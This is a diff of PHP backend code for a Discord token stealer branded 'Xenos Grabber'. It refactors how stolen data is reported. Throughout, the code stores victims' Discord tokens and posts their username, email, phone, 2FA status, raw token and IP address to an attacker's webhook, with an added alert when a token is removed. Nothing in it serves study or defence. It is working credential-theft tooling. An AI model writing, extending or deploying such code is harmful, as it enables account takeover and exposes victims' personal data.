@@ -64,39 +64,11 @@
                             } else {
                                 $phone = "❌";
                             }
-
-                            $json_data = json_encode([
-                                "username" => "Xenos Grabber",
-                                "avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif",
-                                "embeds" => [
-                                    [
-                                        "description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```",
-                                        "footer" => [
-                                            "text" => "Xenos Grabber - https://github.com/KanekiWeb",
-                                            "icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"
-                                        ],
-                                        "thumbnail" => [
-                                           "url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar
-                                        ]
-                                    ]
-                                ]
                             
-                            ]);
-
-                            $ch = curl_init($webhook);
-                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-                            curl_setopt($ch, CURLOPT_POST, 1);
-                            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
-                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                            curl_setopt($ch, CURLOPT_HEADER, 0);
-                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-                            return curl_exec($ch);
-                            curl_close($ch);
-
                             $reponse['success'] = true;
                             $reponse['message'] = 'Token Added to Database.';
-                        
+                            
+                            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```\nIP Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"],"thumbnail" => ["url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar]]]]));
                         } else {
                             $reponse['message'] = 'Token already in our Database.';
                         }
@@ -115,6 +87,8 @@
 
                         $reponse['success'] = true;
                         $reponse['message'] = 'Token Deleted from the Database.';
+
+                        SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> Token Removed From Database:\n```" . $token . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
 
                     } else {
                         $reponse['message'] = 'Incorrect Password';
